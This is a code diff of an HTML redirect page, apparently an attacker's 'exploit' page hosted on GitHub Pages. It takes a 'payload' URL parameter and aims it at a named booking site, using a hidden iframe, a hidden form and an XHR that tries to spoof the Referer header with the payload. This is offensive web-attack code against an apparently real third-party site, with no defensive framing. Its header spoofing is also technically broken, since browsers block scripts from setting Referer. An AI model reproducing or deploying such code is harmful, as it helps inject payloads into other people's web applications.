@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Intermediate Page</title>
     <script>
-        // Function to get URL parameters
         function getUrlParameter(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -13,26 +12,47 @@
             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
         }
 
-        // Function to add payload to target page
-        function addPayloadToPage(payload) {
-            var payloadElement = document.createElement('div');
-            payloadElement.textContent = "Payload: " + payload;
-            document.body.appendChild(payloadElement);
-        }
-
-        // Redirect with Referer and display payload
         window.onload = function() {
             var payload = getUrlParameter('payload');
             if (payload) {
-                // Add payload to target page
-                addPayloadToPage(payload);
-
                 var targetUrl = 'https://tsportalofpurpose.in/oldfiles/booking/create';
-                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/tada.html?payload=' + encodeURIComponent(payload);
+                var fakeReferer = 'https://fcgituser.github.io/fc.github.io/exploit.html';
 
-                // Use a meta refresh to change the Referer and then redirect
-                document.write('<meta http-equiv="refresh" content="0;url=' + targetUrl + '">');
-                window.location.href = targetUrl;
+                // Create a form to submit the request with the Referer header
+                var form = document.createElement('form');
+                form.method = 'GET';
+                form.action = targetUrl;
+                form.target = 'hidden_iframe';
+                form.style.display = 'none';
+
+                // Create a hidden iframe to carry the request
+                var iframe = document.createElement('iframe');
+                iframe.name = 'hidden_iframe';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+
+                // Append the form to the body
+                document.body.appendChild(form);
+
+                // Function to set the referer and submit the form
+                function submitForm() {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', targetUrl, true);
+                    xhr.setRequestHeader('Referer', fakeReferer + '?payload=' + encodeURIComponent(payload));
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status === 200) {
+                                window.location.href = targetUrl;
+                            } else {
+                                document.body.innerHTML = 'Redirection failed. Status: ' + xhr.status;
+                            }
+                        }
+                    };
+                    xhr.send();
+                }
+
+                // Set a short timeout to allow the iframe to load
+                setTimeout(submitForm, 100);
             }
         };
     </script>
